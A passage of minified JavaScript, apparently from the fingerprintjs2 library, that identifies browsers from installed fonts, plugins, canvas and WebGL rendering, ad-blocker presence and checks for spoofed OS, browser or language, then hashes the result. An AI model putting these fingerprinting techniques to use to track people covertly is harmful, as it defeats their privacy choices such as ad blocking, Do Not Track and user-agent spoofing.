                    g = "Abadi MT Condensed Light;Academy Engraved LET;ADOBE CASLON PRO;Adobe Garamond;ADOBE GARAMOND PRO;Agency FB;Aharoni;Albertus Extra Bold;Albertus Medium;Algerian;Amazone BT;American Typewriter;American Typewriter Condensed;AmerType Md BT;Andalus;Angsana New;AngsanaUPC;Antique Olive;Aparajita;Apple Chancery;Apple Color Emoji;Apple SD Gothic Neo;Arabic Typesetting;ARCHER;ARNO PRO;Arrus BT;Aurora Cn BT;AvantGarde Bk BT;AvantGarde Md BT;AVENIR;Ayuthaya;Bandy;Bangla Sangam MN;Bank Gothic;BankGothic Md BT;Baskerville;Baskerville Old Face;Batang;BatangChe;Bauer Bodoni;Bauhaus 93;Bazooka;Bell MT;Bembo;Benguiat Bk BT;Berlin Sans FB;Berlin Sans FB Demi;Bernard MT Condensed;BernhardFashion BT;BernhardMod BT;Big Caslon;BinnerD;Blackadder ITC;BlairMdITC TT;Bodoni 72;Bodoni 72 Oldstyle;Bodoni 72 Smallcaps;Bodoni MT;Bodoni MT Black;Bodoni MT Condensed;Bodoni MT Poster Compressed;Bookshelf Symbol 7;Boulder;Bradley Hand;Bradley Hand ITC;Bremen Bd BT;Britannic Bold;Broadway;Browallia New;BrowalliaUPC;Brush Script MT;Californian FB;Calisto MT;Calligrapher;Candara;CaslonOpnface BT;Castellar;Centaur;Cezanne;CG Omega;CG Times;Chalkboard;Chalkboard SE;Chalkduster;Charlesworth;Charter Bd BT;Charter BT;Chaucer;ChelthmITC Bk BT;Chiller;Clarendon;Clarendon Condensed;CloisterBlack BT;Cochin;Colonna MT;Constantia;Cooper Black;Copperplate;Copperplate Gothic;Copperplate Gothic Bold;Copperplate Gothic Light;CopperplGoth Bd BT;Corbel;Cordia New;CordiaUPC;Cornerstone;Coronet;Cuckoo;Curlz MT;DaunPenh;Dauphin;David;DB LCD Temp;DELICIOUS;Denmark;DFKai-SB;Didot;DilleniaUPC;DIN;DokChampa;Dotum;DotumChe;Ebrima;Edwardian Script ITC;Elephant;English 111 Vivace BT;Engravers MT;EngraversGothic BT;Eras Bold ITC;Eras Demi ITC;Eras Light ITC;Eras Medium ITC;EucrosiaUPC;Euphemia;Euphemia UCAS;EUROSTILE;Exotc350 Bd BT;FangSong;Felix Titling;Fixedsys;FONTIN;Footlight MT Light;Forte;FrankRuehl;Fransiscan;Freefrm721 Blk BT;FreesiaUPC;Freestyle Script;French Script MT;FrnkGothITC Bk BT;Fruitger;FRUTIGER;Futura;Futura Bk BT;Futura Lt BT;Futura Md BT;Futura ZBlk BT;FuturaBlack BT;Gabriola;Galliard BT;Gautami;Geeza Pro;Geometr231 BT;Geometr231 Hv BT;Geometr231 Lt BT;GeoSlab 703 Lt BT;GeoSlab 703 XBd BT;Gigi;Gill Sans;Gill Sans MT;Gill Sans MT Condensed;Gill Sans MT Ext Condensed Bold;Gill Sans Ultra Bold;Gill Sans Ultra Bold Condensed;Gisha;Gloucester MT Extra Condensed;GOTHAM;GOTHAM BOLD;Goudy Old Style;Goudy Stout;GoudyHandtooled BT;GoudyOLSt BT;Gujarati Sangam MN;Gulim;GulimChe;Gungsuh;GungsuhChe;Gurmukhi MN;Haettenschweiler;Harlow Solid Italic;Harrington;Heather;Heiti SC;Heiti TC;HELV;Herald;High Tower Text;Hiragino Kaku Gothic ProN;Hiragino Mincho ProN;Hoefler Text;Humanst 521 Cn BT;Humanst521 BT;Humanst521 Lt BT;Imprint MT Shadow;Incised901 Bd BT;Incised901 BT;Incised901 Lt BT;INCONSOLATA;Informal Roman;Informal011 BT;INTERSTATE;IrisUPC;Iskoola Pota;JasmineUPC;Jazz LET;Jenson;Jester;Jokerman;Juice ITC;Kabel Bk BT;Kabel Ult BT;Kailasa;KaiTi;Kalinga;Kannada Sangam MN;Kartika;Kaufmann Bd BT;Kaufmann BT;Khmer UI;KodchiangUPC;Kokila;Korinna BT;Kristen ITC;Krungthep;Kunstler Script;Lao UI;Latha;Leelawadee;Letter Gothic;Levenim MT;LilyUPC;Lithograph;Lithograph Light;Long Island;Lydian BT;Magneto;Maiandra GD;Malayalam Sangam MN;Malgun Gothic;Mangal;Marigold;Marion;Marker Felt;Market;Marlett;Matisse ITC;Matura MT Script Capitals;Meiryo;Meiryo UI;Microsoft Himalaya;Microsoft JhengHei;Microsoft New Tai Lue;Microsoft PhagsPa;Microsoft Tai Le;Microsoft Uighur;Microsoft YaHei;Microsoft Yi Baiti;MingLiU;MingLiU_HKSCS;MingLiU_HKSCS-ExtB;MingLiU-ExtB;Minion;Minion Pro;Miriam;Miriam Fixed;Mistral;Modern;Modern No. 20;Mona Lisa Solid ITC TT;Mongolian Baiti;MONO;MoolBoran;Mrs Eaves;MS LineDraw;MS Mincho;MS PMincho;MS Reference Specialty;MS UI Gothic;MT Extra;MUSEO;MV Boli;Nadeem;Narkisim;NEVIS;News Gothic;News GothicMT;NewsGoth BT;Niagara Engraved;Niagara Solid;Noteworthy;NSimSun;Nyala;OCR A Extended;Old Century;Old English Text MT;Onyx;Onyx BT;OPTIMA;Oriya Sangam MN;OSAKA;OzHandicraft BT;Palace Script MT;Papyrus;Parchment;Party LET;Pegasus;Perpetua;Perpetua Titling MT;PetitaBold;Pickwick;Plantagenet Cherokee;Playbill;PMingLiU;PMingLiU-ExtB;Poor Richard;Poster;PosterBodoni BT;PRINCETOWN LET;Pristina;PTBarnum BT;Pythagoras;Raavi;Rage Italic;Ravie;Ribbon131 Bd BT;Rockwell;Rockwell Condensed;Rockwell Extra Bold;Rod;Roman;Sakkal Majalla;Santa Fe LET;Savoye LET;Sceptre;Script;Script MT Bold;SCRIPTINA;Serifa;Serifa BT;Serifa Th BT;ShelleyVolante BT;Sherwood;Shonar Bangla;Showcard Gothic;Shruti;Signboard;SILKSCREEN;SimHei;Simplified Arabic;Simplified Arabic Fixed;SimSun;SimSun-ExtB;Sinhala Sangam MN;Sketch Rockwell;Skia;Small Fonts;Snap ITC;Snell Roundhand;Socket;Souvenir Lt BT;Staccato222 BT;Steamer;Stencil;Storybook;Styllo;Subway;Swis721 BlkEx BT;Swiss911 XCm BT;Sylfaen;Synchro LET;System;Tamil Sangam MN;Technical;Teletype;Telugu Sangam MN;Tempus Sans ITC;Terminal;Thonburi;Traditional Arabic;Trajan;TRAJAN PRO;Tristan;Tubular;Tunga;Tw Cen MT;Tw Cen MT Condensed;Tw Cen MT Condensed Extra Bold;TypoUpright BT;Unicorn;Univers;Univers CE 55 Medium;Univers Condensed;Utsaah;Vagabond;Vani;Vijaya;Viner Hand ITC;VisualUI;Vivaldi;Vladimir Script;Vrinda;Westminster;WHITNEY;Wide Latin;ZapfEllipt BT;ZapfHumnst BT;ZapfHumnst Dm BT;Zapfino;Zurich BlkEx BT;Zurich Ex BT;ZWAdobeF".split(";");
                c.options.extendedJsFonts && (f = f.concat(g));
                for (var f = f.concat(c.options.userDefinedFonts), g = document.getElementsByTagName("body")[0], h = document.createElement("div"), w = document.createElement("div"), l = {}, k = {}, m = [], v = 0, u = e.length; v < u; v++) {
                    var n = d();
                    n.style.fontFamily = e[v];
                    h.appendChild(n);
                    m.push(n)
                }
                g.appendChild(h);
                v = 0;
                for (u = e.length; v < u; v++) l[e[v]] = m[v].offsetWidth, k[e[v]] = m[v].offsetHeight;
                m = {};
                v = 0;
                for (u = f.length; v < u; v++) {
                    for (var n = [], p = 0, q = e.length; p < q; p++) {
                        var B;
                        B = f[v];
                        var z = e[p], A = d();
                        A.style.fontFamily =
                            "'" + B + "'," + z;
                        B = A;
                        w.appendChild(B);
                        n.push(B)
                    }
                    m[f[v]] = n
                }
                g.appendChild(w);
                v = [];
                u = 0;
                for (n = f.length; u < n; u++) {
                    p = m[f[u]];
                    q = !1;
                    for (B = 0; B < e.length && !(q = p[B].offsetWidth !== l[e[B]] || p[B].offsetHeight !== k[e[B]]); B++) ;
                    q && v.push(f[u])
                }
                g.removeChild(w);
                g.removeChild(h);
                a.push({key: "js_fonts", value: v});
                b(a)
            }, 1)
        }, pluginsKey: function (a) {
            this.options.excludePlugins || (this.isIE() ? this.options.excludeIEPlugins || a.push({
                key: "ie_plugins",
                value: this.getIEPlugins()
            }) : a.push({key: "regular_plugins", value: this.getRegularPlugins()}));
            return a
        }, getRegularPlugins: function () {
            for (var a = [], b = 0, c = navigator.plugins.length; b < c; b++) a.push(navigator.plugins[b]);
            this.pluginsShouldBeSorted() && (a = a.sort(function (a, b) {
                return a.name > b.name ? 1 : a.name < b.name ? -1 : 0
            }));
            return this.map(a, function (a) {
                var b = this.map(a, function (a) {
                    return [a.type, a.suffixes].join("~")
                }).join(",");
                return [a.name, a.description, b].join("::")
            }, this)
        }, getIEPlugins: function () {
            var a = [];
            if (Object.getOwnPropertyDescriptor && Object.getOwnPropertyDescriptor(window, "ActiveXObject") ||
                "ActiveXObject" in window) a = this.map("AcroPDF.PDF;Adodb.Stream;AgControl.AgControl;DevalVRXCtrl.DevalVRXCtrl.1;MacromediaFlashPaper.MacromediaFlashPaper;Msxml2.DOMDocument;Msxml2.XMLHTTP;PDF.PdfCtrl;QuickTime.QuickTime;QuickTimeCheckObject.QuickTimeCheck.1;RealPlayer;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit);RealVideo.RealVideo(tm) ActiveX Control (32-bit);Scripting.Dictionary;SWCtl.SWCtl;Shell.UIHelper;ShockwaveFlash.ShockwaveFlash;Skype.Detection;TDCCtl.TDCCtl;WMPlayer.OCX;rmocx.RealPlayer G2 Control;rmocx.RealPlayer G2 Control.1".split(";"),
                function (a) {
                    try {
                        return new ActiveXObject(a), a
                    } catch (c) {
                        return null
                    }
                });
            navigator.plugins && (a = a.concat(this.getRegularPlugins()));
            return a
        }, pluginsShouldBeSorted: function () {
            for (var a = !1, b = 0, c = this.options.sortPluginsFor.length; b < c; b++) if (navigator.userAgent.match(this.options.sortPluginsFor[b])) {
                a = !0;
                break
            }
            return a
        }, touchSupportKey: function (a) {
            this.options.excludeTouchSupport || a.push({key: "touch_support", value: this.getTouchSupport()});
            return a
        }, hasSessionStorage: function () {
            try {
                return !!window.sessionStorage
            } catch (a) {
                return !0
            }
        },
        hasLocalStorage: function () {
            try {
                return !!window.localStorage
            } catch (a) {
                return !0
            }
        }, hasIndexedDB: function () {
            return !!window.indexedDB
        }, getNavigatorCpuClass: function () {
            return navigator.cpuClass ? navigator.cpuClass : "unknown"
        }, getNavigatorPlatform: function () {
            return navigator.platform ? navigator.platform : "unknown"
        }, getDoNotTrack: function () {
            return navigator.doNotTrack ? navigator.doNotTrack : navigator.msDoNotTrack ? navigator.msDoNotTrack : window.doNotTrack ? window.doNotTrack : "unknown"
        }, getTouchSupport: function () {
            var a =
                0, b = !1;
            "undefined" !== typeof navigator.maxTouchPoints ? a = navigator.maxTouchPoints : "undefined" !== typeof navigator.msMaxTouchPoints && (a = navigator.msMaxTouchPoints);
            try {
                document.createEvent("TouchEvent"), b = !0
            } catch (c) {
            }
            return [a, b, "ontouchstart" in window]
        }, getCanvasFp: function () {
            var a = [], b = document.createElement("canvas");
            b.width = 2E3;
            b.height = 200;
            b.style.display = "inline";
            var c = b.getContext("2d");
            c.rect(0, 0, 10, 10);
            c.rect(2, 2, 6, 6);
            a.push("canvas winding:" + (!1 === c.isPointInPath(5, 5, "evenodd") ? "yes" : "no"));
            c.textBaseline = "alphabetic";
            c.fillStyle = "#f60";
            c.fillRect(125, 1, 62, 20);
            c.fillStyle = "#069";
            c.font = this.options.dontUseFakeFontInCanvas ? "11pt Arial" : "11pt no-real-font-123";
            c.fillText("Cwm fjordbank glyphs vext quiz, \ud83d\ude03", 2, 15);
            c.fillStyle = "rgba(102, 204, 0, 0.2)";
            c.font = "18pt Arial";
            c.fillText("Cwm fjordbank glyphs vext quiz, \ud83d\ude03", 4, 45);
            c.globalCompositeOperation = "multiply";
            c.fillStyle = "rgb(255,0,255)";
            c.beginPath();
            c.arc(50, 50, 50, 0, 2 * Math.PI, !0);
            c.closePath();
            c.fill();
            c.fillStyle =
                "rgb(0,255,255)";
            c.beginPath();
            c.arc(100, 50, 50, 0, 2 * Math.PI, !0);
            c.closePath();
            c.fill();
            c.fillStyle = "rgb(255,255,0)";
            c.beginPath();
            c.arc(75, 100, 50, 0, 2 * Math.PI, !0);
            c.closePath();
            c.fill();
            c.fillStyle = "rgb(255,0,255)";
            c.arc(75, 75, 75, 0, 2 * Math.PI, !0);
            c.arc(75, 75, 25, 0, 2 * Math.PI, !0);
            c.fill("evenodd");
            a.push("canvas fp:" + b.toDataURL());
            return a.join("~")
        }, getWebglFp: function () {
            function a(a) {
                b.clearColor(0, 0, 0, 1);
                b.enable(b.DEPTH_TEST);
                b.depthFunc(b.LEQUAL);
                b.clear(b.COLOR_BUFFER_BIT | b.DEPTH_BUFFER_BIT);
                return "[" +
                    a[0] + ", " + a[1] + "]"
            }

            var b;
            b = this.getWebglCanvas();
            if (!b) return null;
            var c = [], d = b.createBuffer();
            b.bindBuffer(b.ARRAY_BUFFER, d);
            var e = new Float32Array([-.2, -.9, 0, .4, -.26, 0, 0, .732134444, 0]);
            b.bufferData(b.ARRAY_BUFFER, e, b.STATIC_DRAW);
            d.itemSize = 3;
            d.numItems = 3;
            var e = b.createProgram(), f = b.createShader(b.VERTEX_SHADER);
            b.shaderSource(f, "attribute vec2 attrVertex;varying vec2 varyinTexCoordinate;uniform vec2 uniformOffset;void main(){varyinTexCoordinate\x3dattrVertex+uniformOffset;gl_Position\x3dvec4(attrVertex,0,1);}");
            b.compileShader(f);
            var g = b.createShader(b.FRAGMENT_SHADER);
            b.shaderSource(g, "precision mediump float;varying vec2 varyinTexCoordinate;void main() {gl_FragColor\x3dvec4(varyinTexCoordinate,0,1);}");
            b.compileShader(g);
            b.attachShader(e, f);
            b.attachShader(e, g);
            b.linkProgram(e);
            b.useProgram(e);
            e.vertexPosAttrib = b.getAttribLocation(e, "attrVertex");
            e.offsetUniform = b.getUniformLocation(e, "uniformOffset");
            b.enableVertexAttribArray(e.vertexPosArray);
            b.vertexAttribPointer(e.vertexPosAttrib, d.itemSize, b.FLOAT,
                !1, 0, 0);
            b.uniform2f(e.offsetUniform, 1, 1);
            b.drawArrays(b.TRIANGLE_STRIP, 0, d.numItems);
            null != b.canvas && c.push(b.canvas.toDataURL());
            c.push("extensions:" + b.getSupportedExtensions().join(";"));
            c.push("webgl aliased line width range:" + a(b.getParameter(b.ALIASED_LINE_WIDTH_RANGE)));
            c.push("webgl aliased point size range:" + a(b.getParameter(b.ALIASED_POINT_SIZE_RANGE)));
            c.push("webgl alpha bits:" + b.getParameter(b.ALPHA_BITS));
            c.push("webgl antialiasing:" + (b.getContextAttributes().antialias ? "yes" : "no"));
            c.push("webgl blue bits:" +
                b.getParameter(b.BLUE_BITS));
            c.push("webgl depth bits:" + b.getParameter(b.DEPTH_BITS));
            c.push("webgl green bits:" + b.getParameter(b.GREEN_BITS));
            c.push("webgl max anisotropy:" + function (a) {
                var b,
                    c = a.getExtension("EXT_texture_filter_anisotropic") || a.getExtension("WEBKIT_EXT_texture_filter_anisotropic") || a.getExtension("MOZ_EXT_texture_filter_anisotropic");
                return c ? (b = a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT), 0 === b && (b = 2), b) : null
            }(b));
            c.push("webgl max combined texture image units:" + b.getParameter(b.MAX_COMBINED_TEXTURE_IMAGE_UNITS));
            c.push("webgl max cube map texture size:" + b.getParameter(b.MAX_CUBE_MAP_TEXTURE_SIZE));
            c.push("webgl max fragment uniform vectors:" + b.getParameter(b.MAX_FRAGMENT_UNIFORM_VECTORS));
            c.push("webgl max render buffer size:" + b.getParameter(b.MAX_RENDERBUFFER_SIZE));
            c.push("webgl max texture image units:" + b.getParameter(b.MAX_TEXTURE_IMAGE_UNITS));
            c.push("webgl max texture size:" + b.getParameter(b.MAX_TEXTURE_SIZE));
            c.push("webgl max varying vectors:" + b.getParameter(b.MAX_VARYING_VECTORS));
            c.push("webgl max vertex attribs:" +
                b.getParameter(b.MAX_VERTEX_ATTRIBS));
            c.push("webgl max vertex texture image units:" + b.getParameter(b.MAX_VERTEX_TEXTURE_IMAGE_UNITS));
            c.push("webgl max vertex uniform vectors:" + b.getParameter(b.MAX_VERTEX_UNIFORM_VECTORS));
            c.push("webgl max viewport dims:" + a(b.getParameter(b.MAX_VIEWPORT_DIMS)));
            c.push("webgl red bits:" + b.getParameter(b.RED_BITS));
            c.push("webgl renderer:" + b.getParameter(b.RENDERER));
            c.push("webgl shading language version:" + b.getParameter(b.SHADING_LANGUAGE_VERSION));
            c.push("webgl stencil bits:" +
                b.getParameter(b.STENCIL_BITS));
            c.push("webgl vendor:" + b.getParameter(b.VENDOR));
            c.push("webgl version:" + b.getParameter(b.VERSION));
            if (!b.getShaderPrecisionFormat) return c.join("~");
            c.push("webgl vertex shader high float precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.HIGH_FLOAT).precision);
            c.push("webgl vertex shader high float precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.HIGH_FLOAT).rangeMin);
            c.push("webgl vertex shader high float precision rangeMax:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER,
                b.HIGH_FLOAT).rangeMax);
            c.push("webgl vertex shader medium float precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_FLOAT).precision);
            c.push("webgl vertex shader medium float precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_FLOAT).rangeMin);
            c.push("webgl vertex shader medium float precision rangeMax:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_FLOAT).rangeMax);
            c.push("webgl vertex shader low float precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER,
                b.LOW_FLOAT).precision);
            c.push("webgl vertex shader low float precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.LOW_FLOAT).rangeMin);
            c.push("webgl vertex shader low float precision rangeMax:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.LOW_FLOAT).rangeMax);
            c.push("webgl fragment shader high float precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.HIGH_FLOAT).precision);
            c.push("webgl fragment shader high float precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER,
                b.HIGH_FLOAT).rangeMin);
            c.push("webgl fragment shader high float precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.HIGH_FLOAT).rangeMax);
            c.push("webgl fragment shader medium float precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.MEDIUM_FLOAT).precision);
            c.push("webgl fragment shader medium float precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.MEDIUM_FLOAT).rangeMin);
            c.push("webgl fragment shader medium float precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER,
                b.MEDIUM_FLOAT).rangeMax);
            c.push("webgl fragment shader low float precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.LOW_FLOAT).precision);
            c.push("webgl fragment shader low float precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.LOW_FLOAT).rangeMin);
            c.push("webgl fragment shader low float precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.LOW_FLOAT).rangeMax);
            c.push("webgl vertex shader high int precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.HIGH_INT).precision);
            c.push("webgl vertex shader high int precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.HIGH_INT).rangeMin);
            c.push("webgl vertex shader high int precision rangeMax:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.HIGH_INT).rangeMax);
            c.push("webgl vertex shader medium int precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_INT).precision);
            c.push("webgl vertex shader medium int precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_INT).rangeMin);
            c.push("webgl vertex shader medium int precision rangeMax:" +
                b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.MEDIUM_INT).rangeMax);
            c.push("webgl vertex shader low int precision:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.LOW_INT).precision);
            c.push("webgl vertex shader low int precision rangeMin:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.LOW_INT).rangeMin);
            c.push("webgl vertex shader low int precision rangeMax:" + b.getShaderPrecisionFormat(b.VERTEX_SHADER, b.LOW_INT).rangeMax);
            c.push("webgl fragment shader high int precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER,
                b.HIGH_INT).precision);
            c.push("webgl fragment shader high int precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.HIGH_INT).rangeMin);
            c.push("webgl fragment shader high int precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.HIGH_INT).rangeMax);
            c.push("webgl fragment shader medium int precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.MEDIUM_INT).precision);
            c.push("webgl fragment shader medium int precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER,
                b.MEDIUM_INT).rangeMin);
            c.push("webgl fragment shader medium int precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.MEDIUM_INT).rangeMax);
            c.push("webgl fragment shader low int precision:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.LOW_INT).precision);
            c.push("webgl fragment shader low int precision rangeMin:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER, b.LOW_INT).rangeMin);
            c.push("webgl fragment shader low int precision rangeMax:" + b.getShaderPrecisionFormat(b.FRAGMENT_SHADER,
                b.LOW_INT).rangeMax);
            return c.join("~")
        }, getAdBlock: function () {
            var a = document.createElement("div");
            a.innerHTML = "\x26nbsp;";
            a.className = "adsbox";
            var b = "0";
            try {
                document.body.appendChild(a), 0 === document.getElementsByClassName("adsbox")[0].offsetHeight && (b = "1"), document.body.removeChild(a)
            } catch (c) {
                b = "0"
            }
            return b
        }, getHasLiedLanguages: function () {
            if ("undefined" !== typeof navigator.languages) try {
                if (navigator.languages[0].substr(0, 2) !== navigator.language.substr(0, 2)) return !0
            } catch (a) {
                return !0
            }
            return !1
        }, getHasLiedResolution: function () {
            return screen.width <
            screen.availWidth || screen.height < screen.availHeight ? !0 : !1
        }, getHasLiedOs: function () {
            var a = navigator.userAgent.toLowerCase(), b = navigator.oscpu, c = navigator.platform.toLowerCase(),
                a = 0 <= a.indexOf("windows phone") ? "Windows Phone" : 0 <= a.indexOf("win") ? "Windows" : 0 <= a.indexOf("android") ? "Android" : 0 <= a.indexOf("linux") ? "Linux" : 0 <= a.indexOf("iphone") || 0 <= a.indexOf("ipad") ? "iOS" : 0 <= a.indexOf("mac") ? "Mac" : "Other";
            return ("ontouchstart" in window || 0 < navigator.maxTouchPoints || 0 < navigator.msMaxTouchPoints) && "Windows Phone" !==
            a && "Android" !== a && "iOS" !== a && "Other" !== a || "undefined" !== typeof b && (b = b.toLowerCase(), 0 <= b.indexOf("win") && "Windows" !== a && "Windows Phone" !== a || 0 <= b.indexOf("linux") && "Linux" !== a && "Android" !== a || 0 <= b.indexOf("mac") && "Mac" !== a && "iOS" !== a || 0 === b.indexOf("win") && 0 === b.indexOf("linux") && 0 <= b.indexOf("mac") && "other" !== a) ? !0 : 0 <= c.indexOf("win") && "Windows" !== a && "Windows Phone" !== a || (0 <= c.indexOf("linux") || 0 <= c.indexOf("android") || 0 <= c.indexOf("pike")) && "Linux" !== a && "Android" !== a || (0 <= c.indexOf("mac") || 0 <=
                c.indexOf("ipad") || 0 <= c.indexOf("ipod") || 0 <= c.indexOf("iphone")) && "Mac" !== a && "iOS" !== a || 0 === c.indexOf("win") && 0 === c.indexOf("linux") && 0 <= c.indexOf("mac") && "other" !== a ? !0 : "undefined" === typeof navigator.plugins && "Windows" !== a && "Windows Phone" !== a ? !0 : !1
        }, getHasLiedBrowser: function () {
            var a = navigator.userAgent.toLowerCase(), b = navigator.productSub,
                a = 0 <= a.indexOf("firefox") ? "Firefox" : 0 <= a.indexOf("opera") || 0 <= a.indexOf("opr") ? "Opera" : 0 <= a.indexOf("chrome") ? "Chrome" : 0 <= a.indexOf("safari") ? "Safari" : 0 <= a.indexOf("trident") ?
                    "Internet Explorer" : "Other";
            if (("Chrome" === a || "Safari" === a || "Opera" === a) && "20030107" !== b) return !0;
            b = eval.toString().length;
            if (37 === b && "Safari" !== a && "Firefox" !== a && "Other" !== a || 39 === b && "Internet Explorer" !== a && "Other" !== a || 33 === b && "Chrome" !== a && "Opera" !== a && "Other" !== a) return !0;
            var c;
            try {
                throw"a";
            } catch (d) {
                try {
                    d.toSource(), c = !0
                } catch (e) {
                    c = !1
                }
            }
            return c && "Firefox" !== a && "Other" !== a ? !0 : !1
        }, isCanvasSupported: function () {
            var a = document.createElement("canvas");
            return !(!a.getContext || !a.getContext("2d"))
        },
        isWebGlSupported: function () {
            if (!this.isCanvasSupported()) return !1;
            var a = document.createElement("canvas"), b;
            try {
                b = a.getContext && (a.getContext("webgl") || a.getContext("experimental-webgl"))
            } catch (c) {
                b = !1
            }
            return !!window.WebGLRenderingContext && !!b
        }, isIE: function () {
            return "Microsoft Internet Explorer" === navigator.appName || "Netscape" === navigator.appName && /Trident/.test(navigator.userAgent) ? !0 : !1
        }, hasSwfObjectLoaded: function () {
            return "undefined" !== typeof window.swfobject
        }, hasMinFlashInstalled: function () {
            return V.hasFlashPlayerVersion("9.0.0")
        },
        addFlashDivNode: function () {
            var a = document.createElement("div");
            a.setAttribute("id", this.options.swfContainerId);
            document.body.appendChild(a)
        }, loadSwfAndDetectFonts: function (a) {
            window.___fp_swf_loaded = function (b) {
                a(b)
            };
            var b = this.options.swfContainerId;
            this.addFlashDivNode();
            V.embedSWF(this.options.swfPath, b, "1", "1", "9.0.0", !1, {onReady: "___fp_swf_loaded"}, {
                allowScriptAccess: "always",
                menu: "false"
            }, {})
        }, getWebglCanvas: function () {
            var a = document.createElement("canvas"), b = null;
            try {
                b = a.getContext("webgl") ||
                    a.getContext("experimental-webgl")
            } catch (c) {
            }
            b || (b = null);
            return b
        }, each: function (a, b, c) {
            if (null !== a) if (this.nativeForEach && a.forEach === this.nativeForEach) a.forEach(b, c); else if (a.length === +a.length) for (var d = 0, e = a.length; d < e && b.call(c, a[d], d, a) !== {}; d++) ; else for (d in a) if (a.hasOwnProperty(d) && b.call(c, a[d], d, a) === {}) break
        }, map: function (a, b, c) {
            var d = [];
            if (null == a) return d;
            if (this.nativeMap && a.map === this.nativeMap) return a.map(b, c);
            this.each(a, function (a, f, g) {
                d[d.length] = b.call(c, a, f, g)
            });
            return d
        },
        x64Add: function (a, b) {
            a = [a[0] >>> 16, a[0] & 65535, a[1] >>> 16, a[1] & 65535];
            b = [b[0] >>> 16, b[0] & 65535, b[1] >>> 16, b[1] & 65535];
            var c = [0, 0, 0, 0];
            c[3] += a[3] + b[3];
            c[2] += c[3] >>> 16;
            c[3] &= 65535;
            c[2] += a[2] + b[2];
            c[1] += c[2] >>> 16;
            c[2] &= 65535;
            c[1] += a[1] + b[1];
            c[0] += c[1] >>> 16;
            c[1] &= 65535;
            c[0] += a[0] + b[0];
            c[0] &= 65535;
            return [c[0] << 16 | c[1], c[2] << 16 | c[3]]
        }, x64Multiply: function (a, b) {
            a = [a[0] >>> 16, a[0] & 65535, a[1] >>> 16, a[1] & 65535];
            b = [b[0] >>> 16, b[0] & 65535, b[1] >>> 16, b[1] & 65535];
            var c = [0, 0, 0, 0];
            c[3] += a[3] * b[3];
            c[2] += c[3] >>> 16;
            c[3] &= 65535;
            c[2] += a[2] * b[3];
            c[1] += c[2] >>> 16;
            c[2] &= 65535;
            c[2] += a[3] * b[2];
            c[1] += c[2] >>> 16;
            c[2] &= 65535;
            c[1] += a[1] * b[3];
            c[0] += c[1] >>> 16;
            c[1] &= 65535;
            c[1] += a[2] * b[2];
            c[0] += c[1] >>> 16;
            c[1] &= 65535;
            c[1] += a[3] * b[1];
            c[0] += c[1] >>> 16;
            c[1] &= 65535;
            c[0] += a[0] * b[3] + a[1] * b[2] + a[2] * b[1] + a[3] * b[0];
            c[0] &= 65535;
            return [c[0] << 16 | c[1], c[2] << 16 | c[3]]
        }, x64Rotl: function (a, b) {
            b %= 64;
            if (32 === b) return [a[1], a[0]];
            if (32 > b) return [a[0] << b | a[1] >>> 32 - b, a[1] << b | a[0] >>> 32 - b];
            b -= 32;
            return [a[1] << b | a[0] >>> 32 - b, a[0] << b | a[1] >>> 32 - b]
        }, x64LeftShift: function (a,
                                   b) {
            b %= 64;
            return 0 === b ? a : 32 > b ? [a[0] << b | a[1] >>> 32 - b, a[1] << b] : [a[1] << b - 32, 0]
        }, x64Xor: function (a, b) {
            return [a[0] ^ b[0], a[1] ^ b[1]]
        }, x64Fmix: function (a) {
            a = this.x64Xor(a, [0, a[0] >>> 1]);
            a = this.x64Multiply(a, [4283543511, 3981806797]);
            a = this.x64Xor(a, [0, a[0] >>> 1]);
            a = this.x64Multiply(a, [3301882366, 444984403]);
            return a = this.x64Xor(a, [0, a[0] >>> 1])
        }, x64hash128: function (a, b) {
            a = a || "";
            b = b || 0;
            for (var c = a.length % 16, d = a.length - c, e = [0, b], f = [0, b], g, h, l = [2277735313, 289559509], n = [1291169091, 658871167], k = 0; k < d; k += 16) g = [a.charCodeAt(k +
